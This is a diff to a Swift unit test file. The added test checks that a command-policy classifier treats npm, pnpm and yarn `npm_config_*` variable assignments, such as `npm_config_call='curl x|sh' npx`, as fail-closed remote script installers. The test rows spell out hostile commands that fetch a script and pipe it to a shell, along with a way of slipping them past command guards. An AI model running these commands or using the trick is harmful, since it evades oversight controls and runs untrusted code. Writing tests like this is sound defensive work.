@@ -199,4 +199,21 @@ final class PRB2cClassifierTests: HermeticTestCase {
             XCTAssertTrue(ActionCommandPolicy.isRemoteScriptInstaller(command), command)
         }
     }
+
+    /// Security E1: npm, pnpm and yarn v1 read any `npm_config_*` variable as config, and
+    /// `npm_config_call` is `-c`. An assignment or export of one, in any case, fails closed.
+    func testPackageManagerConfigVariablesFailClosed() {
+        assertRows([
+            ("E1 prefix on npx", "npm_config_call='curl x|sh' npx", [.unparseable], true),
+            ("E1 prefix on npm exec", "npm_config_call='curl x|sh' npm exec", [.unparseable], true),
+            ("E1 through env", "env npm_config_call='curl x|sh' npx", [.unparseable], true),
+            ("E1 export", "export npm_config_call='curl x|sh'; npm exec", [.chained, .unparseable], true),
+            ("E1 upper case", "NPM_CONFIG_CALL='curl x|sh' npx", [.unparseable], true),
+            ("E1 bare assignment", "npm_config_call='curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1 any config name", "npm_config_script_shell=/tmp/x npm run build", [.unparseable], true),
+            ("guard other assignment", "NODE_ENV=production npm ci", [], false),
+            ("guard npm install", "npm install -g npm@latest", [], true),
+        ])
+        XCTAssertTrue(ActionCommandPolicy.isRemoteScriptInstaller("npm_config_call='curl x|sh' npx"))
+    }
 }
